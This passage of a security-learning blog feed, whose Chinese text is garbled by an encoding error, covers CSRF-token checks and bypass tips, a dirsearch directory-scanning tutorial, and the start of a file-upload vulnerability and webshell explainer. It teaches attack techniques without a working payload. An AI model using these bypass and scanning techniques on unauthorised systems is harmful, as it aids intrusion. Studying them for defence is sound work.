invoke__">validateCSRFToken</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;CSRF Token éªŒè¯å¤±è´¥&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è·å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="comment">// è¾“å‡ºç”¨æˆ·è¾“å…¥çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å§“åï¼š<span class="subst">$name</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;é‚®ç®±ï¼š<span class="subst">$email</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”Ÿæˆ CSRF Token</span></span><br><span class="line"><span class="variable">$csrfToken</span> = <span class="title function_ invoke__">generateCSRFToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSRF Token ç¤ºä¾‹&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CSRF Token ç¤ºä¾‹&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]; ?&gt;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;csrf_token&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$csrfToken</span>; ?&gt;&quot;</span> /&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;name&quot;</span>&gt;å§“åï¼š&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> id=<span class="string">&quot;name&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;email&quot;</span>&gt;é‚®ç®±ï¼š&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;email&quot;</span> name=<span class="string">&quot;email&quot;</span> id=<span class="string">&quot;email&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼šCSRF Token æ˜¯ä¸€ç§æ›´å¯é çš„æ–¹æ³•ï¼Œå› ä¸ºå®ƒé€šè¿‡ä¼šè¯å­˜å‚¨å’ŒéªŒè¯ï¼Œéš¾ä»¥è¢«ä¼ªé€ ã€‚</p><h4 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><p>tokenï¼šï¼ˆä¸ä¸¥è°¨ï¼‰</p><p>å¤ç”¨ï¼štokan<br>åˆ é™¤     ä¸å¸¦è¯¥å‚æ•°<br>ç½®ç©º      token&#x3D;</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>**ä½¿ç”¨ <code>HTTP_REFERER</code> æˆ– <code>HTTP_ORIGIN</code>**ï¼šè¿™äº›æ–¹æ³•ç®€å•æ˜“ç”¨ï¼Œä½†ä¸å¤Ÿå®‰å…¨ï¼Œå› ä¸ºè¿™äº›å¤´éƒ¨å­—æ®µå¯ä»¥è¢«å®¢æˆ·ç«¯ä¼ªé€ ã€‚</li><li><strong>ä½¿ç”¨ CSRF Token</strong>ï¼šè¿™æ˜¯ä¸€ç§æ›´å®‰å…¨çš„æ–¹æ³•ï¼Œé€šè¿‡ç”Ÿæˆå’ŒéªŒè¯ CSRF Tokenï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢ CSRF æ”»å‡»ã€‚</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dirseachçš„å®‰è£…å’Œä½¿ç”¨</title>
      <link href="/2025/05/21/dirseach%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2025/05/21/dirseach%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p><a href="https://so.csdn.net/so/search?q=dirsearch&spm=1001.2101.3001.7020">dirsearch</a>æ˜¯ä¸€ä¸ªåŸºäºpythonçš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºæš´åŠ›æ‰«æé¡µé¢ç»“æ„ï¼ŒåŒ…æ‹¬ç½‘é¡µä¸­çš„ç›®å½•å’Œæ–‡ä»¶ã€‚</p><p>dirsearchä¸‹è½½åœ°å€ï¼šÂ <a href="https://github.com/maurosoria/dirsearch" title="GitHub - maurosoria/dirsearch: Web path scanner">GitHub - maurosoria&#x2F;dirsearch: Web path scanner</a></p><p>è¿è¡Œç¯å¢ƒï¼šå¿…é¡»å®‰è£…python3.7æˆ–æ›´é«˜ç‰ˆæœ¬</p><h2 id="ä¸€ã€Dirsearchæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸€ã€Dirsearchæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸€ã€Dirsearchæ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä¸€ã€Dirsearchæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>Dirsearchæ˜¯ä¸€ä¸ªç”¨äºæ¢æµ‹WEBæœåŠ¡å™¨ä¸‹çš„<strong>æ•æ„Ÿæ–‡ä»¶&#x2F;ç›®å½•</strong>çš„å‘½ä»¤è¡Œå·¥å…·ã€‚</p><h2 id="äºŒã€å®‰è£…å’Œä½¿ç”¨"><a href="#äºŒã€å®‰è£…å’Œä½¿ç”¨" class="headerlink" title="äºŒã€å®‰è£…å’Œä½¿ç”¨"></a>äºŒã€å®‰è£…å’Œä½¿ç”¨</h2><h3 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="1.å®‰è£…"></a>1.å®‰è£…</h3><p>1.1é€‰æ‹©ä»¥ä¸‹å®‰è£…é€‰é¡¹ä¹‹ä¸€ï¼š</p><ul><li>ä½¿ç”¨Â <strong>git</strong>Â å®‰è£…ï¼šï¼ˆ<strong>æ¨è</strong><code>git clone https://github.com/maurosoria/dirsearch.git --depth 1</code>)</li><li>ä½¿ç”¨ ZIP æ–‡ä»¶å®‰è£…ï¼š<a href="https://github.com/maurosoria/dirsearch/archive/master.zip" title="åœ¨æ­¤å¤„ä¸‹è½½">åœ¨æ­¤å¤„ä¸‹è½½</a></li><li>ä½¿ç”¨ Docker å®‰è£…ï¼šï¼ˆæ›´å¤šä¿¡æ¯å¯ä»¥<a href="https://github.com/maurosoria/dirsearch#support-docker" title="åœ¨è¿™é‡Œ">åœ¨è¿™é‡Œ</a>æ‰¾åˆ°<code>docker build -t &quot;dirsearch:v0.4.3&quot; .</code>)</li><li>ä½¿ç”¨ PyPi å®‰è£…ï¼šæˆ–<code>pip3 install dirsearch``pip install dirsearch</code></li><li>ä½¿ç”¨ Kali Linux å®‰è£…ï¼šï¼ˆå·²å¼ƒç”¨ï¼‰<code>sudo apt-get install dirsearch</code></li></ul><p>1.2ä¸‹è½½zipåŒ…ï¼Œè§£å‹åè¿›å…¥æ§åˆ¶å°ï¼Œè¾“å…¥ä¸‹é¢å‘½ä»¤è¿›è¡Œå®‰è£…ä¾èµ–ï¼š</p><blockquote><p>pip3 install -rÂ requirements.txtÂ  Â  Â  Â  &#x2F;&#x2F;å®‰è£…ä¾èµ–</p></blockquote><p><img src="https://i-blog.csdnimg.cn/blog_migrate/c3d17841af4d685b8bb7a98de8270d51.png"></p><blockquote><p>Â python dirsearch.py -hÂ  Â  Â  Â  &#x2F;&#x2F;æŸ¥çœ‹å¸®åŠ©</p></blockquote><p><img src="https://i-blog.csdnimg.cn/blog_migrate/41ac200e7abd9a1eb6311c40ccd5453c.png"></p><p>Â å¸®åŠ©ä¿¡æ¯çš„ç®€å•ç¿»è¯‘ï¼š</p><blockquote><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">-h, <span class="comment">--help                                 æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯å¹¶é€€å‡º</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="2-ä½¿ç”¨æ–¹æ³•"><a href="#2-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="2.ä½¿ç”¨æ–¹æ³•"></a><strong>2.ä½¿ç”¨æ–¹æ³•</strong></h2><h4 id="1-åŸºæœ¬æ‰«æå‘½ä»¤"><a href="#1-åŸºæœ¬æ‰«æå‘½ä»¤" class="headerlink" title="1. åŸºæœ¬æ‰«æå‘½ä»¤"></a>1. <strong>åŸºæœ¬æ‰«æå‘½ä»¤</strong></h4><ul><li>æ‰«ææŒ‡å®š URLï¼š<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com</span><br></pre></td></tr></table></figure></li><li>æŒ‡å®šæ–‡ä»¶æ‰©å±•åï¼ˆå¦‚ <code>php,html,js</code>ï¼‰ï¼š<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -e php,html,js</span><br></pre></td></tr></table></figure></li><li>ä½¿ç”¨è‡ªå®šä¹‰å­—å…¸æ–‡ä»¶ï¼š<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -w /path/to/your/wordlist.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-é«˜çº§é€‰é¡¹"><a href="#3-é«˜çº§é€‰é¡¹" class="headerlink" title="3. é«˜çº§é€‰é¡¹"></a>3. <strong>é«˜çº§é€‰é¡¹</strong></h4><ul><li><strong>é€’å½’æ‰«æ</strong>ï¼šä½¿ç”¨ <code>-r</code> å‚æ•°è¿›è¡Œé€’å½’æ‰«æï¼Œå¯ä»¥å‘ç°æ›´å¤šéšè—çš„å­ç›®å½•ã€‚<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -r</span><br></pre></td></tr></table></figure></li><li><strong>è®¾ç½®çº¿ç¨‹æ•°</strong>ï¼šä½¿ç”¨ <code>-t</code> å‚æ•°è®¾ç½®å¹¶å‘çº¿ç¨‹æ•°ï¼Œæé«˜æ‰«æé€Ÿåº¦ã€‚<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -t 20</span><br></pre></td></tr></table></figure></li><li><strong>æ’é™¤çŠ¶æ€ç </strong>ï¼šä½¿ç”¨ <code>-x</code> å‚æ•°æ’é™¤æŸäº› HTTP çŠ¶æ€ç ï¼Œå‡å°‘ç»“æœå™ªå£°ã€‚<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -x 404,403</span><br></pre></td></tr></table></figure></li><li><strong>è¾“å‡ºç»“æœåˆ°æ–‡ä»¶</strong>ï¼šä½¿ç”¨ <code>-o</code> å‚æ•°å°†ç»“æœä¿å­˜åˆ°æ–‡ä»¶ã€‚<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -o results.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-è‡ªå®šä¹‰å­—å…¸"><a href="#4-è‡ªå®šä¹‰å­—å…¸" class="headerlink" title="4. è‡ªå®šä¹‰å­—å…¸"></a>4. <strong>è‡ªå®šä¹‰å­—å…¸</strong></h4><ul><li><code>dirsearch</code> ä½¿ç”¨å†…ç½®å­—å…¸è¿›è¡Œæ‰«æï¼Œä½†ä½ å¯ä»¥é€šè¿‡ <code>-w</code> å‚æ•°æŒ‡å®šè‡ªå®šä¹‰å­—å…¸æ–‡ä»¶ã€‚</li></ul><h3 id="é«˜çº§æŠ€å·§"><a href="#é«˜çº§æŠ€å·§" class="headerlink" title="é«˜çº§æŠ€å·§"></a>é«˜çº§æŠ€å·§</h3><h4 id="1-è®¾ç½®ä»£ç†"><a href="#1-è®¾ç½®ä»£ç†" class="headerlink" title="1. è®¾ç½®ä»£ç†"></a>1. <strong>è®¾ç½®ä»£ç†</strong></h4><ul><li>ä½¿ç”¨ <code>--proxy</code> å‚æ•°æŒ‡å®šä»£ç†æœåŠ¡å™¨ï¼Œéšè—çœŸå® IP åœ°å€ã€‚<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com --proxy http://127.0.0.1:8080</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-è‡ªå®šä¹‰è¯·æ±‚å¤´"><a href="#2-è‡ªå®šä¹‰è¯·æ±‚å¤´" class="headerlink" title="2. è‡ªå®šä¹‰è¯·æ±‚å¤´"></a>2. <strong>è‡ªå®šä¹‰è¯·æ±‚å¤´</strong></h4><ul><li>ä½¿ç”¨ <code>-H</code> å‚æ•°å®šåˆ¶è¯·æ±‚å¤´ï¼Œä¾‹å¦‚æ·»åŠ  <code>User-Agent</code>ã€‚<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com -H <span class="string">&quot;User-Agent: IE&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-é™åˆ¶æ‰«æé€Ÿç‡"><a href="#3-é™åˆ¶æ‰«æé€Ÿç‡" class="headerlink" title="3. é™åˆ¶æ‰«æé€Ÿç‡"></a>3. <strong>é™åˆ¶æ‰«æé€Ÿç‡</strong></h4><ul><li>ä½¿ç”¨ <code>--max-rate</code> å‚æ•°é™åˆ¶æ‰«æé€Ÿç‡ï¼Œé¿å…å¯¹ç›®æ ‡æœåŠ¡å™¨é€ æˆè¿‡å¤§è´Ÿè½½ã€‚<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://example.com --max-rate 10</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-å®æ—¶æ—¥å¿—æŸ¥çœ‹"><a href="#4-å®æ—¶æ—¥å¿—æŸ¥çœ‹" class="headerlink" title="4. å®æ—¶æ—¥å¿—æŸ¥çœ‹"></a>4. <strong>å®æ—¶æ—¥å¿—æŸ¥çœ‹</strong></h4><ul><li>é€šè¿‡ Web æ§åˆ¶å°å®æ—¶æŸ¥çœ‹æ‰«ææ—¥å¿—å’Œç»“æœã€‚</li></ul><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul><li><strong>åˆæ³•æ€§</strong>ï¼šä»…åœ¨åˆæ³•æˆæƒçš„æƒ…å†µä¸‹å¯¹ç›®æ ‡è¿›è¡Œæ‰«æã€‚æœªç»æˆæƒçš„æ‰«æå¯èƒ½è¿åæ³•å¾‹å’Œé“å¾·è§„èŒƒã€‚</li><li><strong>æ€§èƒ½</strong>ï¼šè°ƒæ•´çº¿ç¨‹æ•°å’Œå­—å…¸å¤§å°ä»¥å¹³è¡¡æ‰«æé€Ÿåº¦å’Œç³»ç»Ÿè´Ÿè½½ã€‚</li></ul><p>é€šè¿‡è¿™äº›åŸºæœ¬å’Œé«˜çº§ç”¨æ³•ï¼Œä½ å¯ä»¥çµæ´»åœ°ä½¿ç”¨ <code>dirsearch</code> æ¥å‘ç°ç½‘ç«™ä¸Šçš„éšè—æ–‡ä»¶å’Œç›®å½•ï¼Œä»è€Œæé«˜å®‰å…¨æ€§ã€‚</p><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Â Â Â Â Â Â Â Â ä»¥ä¸Šå°±æ˜¯ä»Šå¤©è¦è®²çš„å†…å®¹ï¼Œæœ¬æ–‡æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨æœ‰æ•ˆçš„Webç›®å½•æš´åŠ›ç ´è§£å·¥å…·Dirsearchæ¥æ‰«æå’Œæœç´¢ç”¨æˆ·å¯èƒ½çœ‹ä¸åˆ°çš„éšè—Webç›®å½•ã€‚<br>####################<br>å…è´£å£°æ˜ï¼šå·¥å…·æœ¬èº«å¹¶æ— å¥½åï¼Œå¸Œæœ›å¤§å®¶ä»¥éµå®ˆã€Šç½‘ç»œå®‰å…¨æ³•ã€‹ç›¸å…³æ³•å¾‹ä¸ºå‰ææ¥ä½¿ç”¨è¯¥å·¥å…·ï¼Œæ”¯æŒç ”ç©¶å­¦ä¹ ï¼Œåˆ‡å‹¿ç”¨äºéæ³•çŠ¯ç½ªæ´»åŠ¨ï¼Œå¯¹äºæ¶æ„ä½¿ç”¨è¯¥å·¥å…·é€ æˆçš„æŸå¤±ï¼Œå’Œæœ¬äººåŠå¼€å‘è€…æ— å…³ã€‚<br>####################</p>]]></content>
      
      
      
        <tags>
            
            <tag> å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload</title>
      <link href="/2025/05/17/upload/"/>
      <url>/2025/05/17/upload/</url>
      
        <content type="html"><![CDATA[<h1 id="2-1-åŸºæœ¬åŸç†"><a href="#2-1-åŸºæœ¬åŸç†" class="headerlink" title="2.1 åŸºæœ¬åŸç†"></a>2.1 åŸºæœ¬åŸç†</h1><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”±äºç¨‹åºå‘˜&#x3D;&#x3D;æœªå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œè€Œå¯¼è‡´çš„ç”¨æˆ·å¯ä»¥è¶Šè¿‡å…¶æœ¬èº«æƒé™&#x3D;&#x3D;<br>å‘æœåŠ¡å™¨ä¸Šä¼ å¯æ‰§è¡Œçš„åŠ¨æ€è„šæœ¬æ–‡ä»¶ã€‚å¦‚å¸¸è§çš„å¤´åƒä¸Šä¼ ï¼Œå›¾ç‰‡ä¸Šä¼ ï¼Œoa åŠå…¬æ–‡ä»¶ä¸Šä¼ ï¼Œåª’ä½“ä¸Šä¼ ï¼Œå…è®¸</p><p>ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ï¼Œå¦‚æœ&#x3D;&#x3D;è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œæ¶æ„ç”¨æˆ·åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸Šä¼ æœ‰å®³çš„å¯ä»¥æ‰§è¡Œè„šæœ¬æ–‡ä»¶åˆ°æœåŠ¡å™¨ä¸­ï¼Œ&#x3D;&#x3D;</p><p>å¯ä»¥è·å–æœåŠ¡å™¨çš„æƒé™ï¼Œæˆ–è¿›ä¸€æ­¥å±å®³æœåŠ¡å™¨</p><h1 id="2-2-å±å®³"><a href="#2-2-å±å®³" class="headerlink" title="2.2 å±å®³"></a>2.2 å±å®³</h1><p>éæ³•ç”¨æˆ·å¯ä»¥ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œç”šè‡³æ˜¯æ§åˆ¶æœåŠ¡å™¨ï¼Œè¿™ä¸ªæ¶æ„è„šæœ¬æ–‡ä»¶ï¼Œåˆè¢«ç§°ä¸º webshellï¼Œ</p><p>ä¸Šä¼  webshell åé—¨ å¾ˆæ–¹ä¾¿åœ°æŸ¥çœ‹æœåŠ¡å™¨ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç›®å½•ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç­‰ã€‚</p><h1 id="2-3-æœ‰å…³æ–‡ä»¶ä¸Šä¼ çš„çŸ¥è¯†"><a href="#2-3-æœ‰å…³æ–‡ä»¶ä¸Šä¼ çš„çŸ¥è¯†" class="headerlink" title="2.3 æœ‰å…³æ–‡ä»¶ä¸Šä¼ çš„çŸ¥è¯†"></a>2.3 æœ‰å…³æ–‡ä»¶ä¸Šä¼ çš„çŸ¥è¯†</h1><h3 id="æ–‡ä»¶ä¸Šä¼ çš„è¿‡ç¨‹"><a href="#æ–‡ä»¶ä¸Šä¼ çš„è¿‡ç¨‹" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ çš„è¿‡ç¨‹"></a>æ–‡ä»¶ä¸Šä¼ çš„è¿‡ç¨‹</h3><p>å®¢æˆ·ç«¯ï¼š</p><ol><li>é€‰æ‹©å‘é€çš„æ–‡ä»¶</li><li>æœåŠ¡å™¨æ¥æ”¶</li><li>ç½‘ç«™ç¨‹åºåˆ¤æ–­</li><li>ä¸´æ—¶æ–‡ä»¶</li><li>ç§»åŠ¨åˆ°æŒ‡å®šçš„è·¯å¾„</li></ol><p>æœåŠ¡å™¨ï¼š</p><ul><li>æ¥æ”¶çš„èµ„æºç¨‹åº</li></ul><h3 id="æœåŠ¡å™¨æ¥æ”¶èµ„æºä»£ç "><a href="#æœåŠ¡å™¨æ¥æ”¶èµ„æºä»£ç " class="headerlink" title="æœåŠ¡å™¨æ¥æ”¶èµ„æºä»£ç "></a>æœåŠ¡å™¨æ¥æ”¶èµ„æºä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Size: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å®¢æˆ·ç«¯æ–‡ä»¶ä¸Šä¼ çš„ä»£ç "><a href="#å®¢æˆ·ç«¯æ–‡ä»¶ä¸Šä¼ çš„ä»£ç " class="headerlink" title="å®¢æˆ·ç«¯æ–‡ä»¶ä¸Šä¼ çš„ä»£ç "></a>å®¢æˆ·ç«¯æ–‡ä»¶ä¸Šä¼ çš„ä»£ç </h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶ä¸Šä¼ ä»£ç "><a href="#æ–‡ä»¶ä¸Šä¼ ä»£ç " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ä»£ç "></a>æ–‡ä»¶ä¸Šä¼ ä»£ç </h3><p>æ–‡ä»¶ä¸Šä¼ æ—¶ä¼šè¿”å›ä¸€äº›ä»£ç ï¼Œè¿”å›å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯æ ¹æ®è¿™äº›å€¼åˆ¤æ–­ä¸Šä¼ æ˜¯å¦æ­£å¸¸ï¼š</p><ul><li>å€¼ï¼š0; æ²¡æœ‰é”™è¯¯å‘ç”Ÿï¼Œæ–‡ä»¶ä¸Šä¼ æˆåŠŸã€‚</li><li>å€¼ï¼š1; ä¸Šä¼ çš„æ–‡ä»¶è¶…è¿‡äº† <code>php.ini</code> ä¸­ <code>upload_max_filesize</code> é€‰é¡¹é™åˆ¶çš„å€¼ã€‚</li><li>å€¼ï¼š2; ä¸Šä¼ æ–‡ä»¶çš„å¤§å°è¶…è¿‡äº† HTML è¡¨å•ä¸­ <code>MAX_FILE_SIZE</code> é€‰é¡¹æŒ‡å®šçš„å€¼ã€‚</li><li>å€¼ï¼š3; æ–‡ä»¶åªæœ‰éƒ¨åˆ†è¢«ä¸Šä¼ ã€‚</li><li>å€¼ï¼š4; æ²¡æœ‰æ–‡ä»¶è¢«ä¸Šä¼ ã€‚</li></ul><h3 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h3><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼š</p><ul><li><strong>ç›´æ¥æ–‡ä»¶ä¸Šä¼ </strong>ï¼šè¿™ç§æ¼æ´å±äºé«˜å±æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥é€šè¿‡ä¸Šä¼ ç‚¹è·å–ç½‘ç«™æ§åˆ¶æƒé™ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ã€‚</li><li><strong>æœ‰æ¡ä»¶é™åˆ¶çš„ä¸Šä¼ æ¼æ´</strong>ï¼šè¿™ç§æ¼æ´é€šå¸¸æ˜¯ç”±äºå¼€å‘è€…ç»éªŒä¸è¶³ï¼Œå¯¹æ–‡ä»¶ä¸Šä¼ åšäº†ç®€å•é™åˆ¶ï¼Œå¦‚å‰ç«¯è®¤è¯ã€æ–‡ä»¶å¤´æ£€æµ‹ç­‰ï¼Œè¿™äº›é™åˆ¶å¯ä»¥è¢«ç»•è¿‡ã€‚</li><li><strong>æƒé™è®¤è¯é—®é¢˜</strong>ï¼šæ²¡æœ‰å¯¹æ–‡ä»¶ä¸Šä¼ é¡µé¢è¿›è¡Œæƒé™è®¤è¯ï¼ŒåŒ¿åç”¨æˆ·å¯ä»¥è®¿é—®ä¸Šä¼ åŠŸèƒ½ï¼Œä¸Šä¼ åé—¨åˆ°ç½‘ç«™ç›®å½•ï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªç½‘ç«™ã€‚</li><li><strong>ä¸Šä¼ é€»è¾‘é—®é¢˜</strong>ï¼šæ–‡ä»¶ä¸Šä¼ é€»è¾‘å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ç»•è¿‡é™åˆ¶ï¼Œä¸Šä¼ 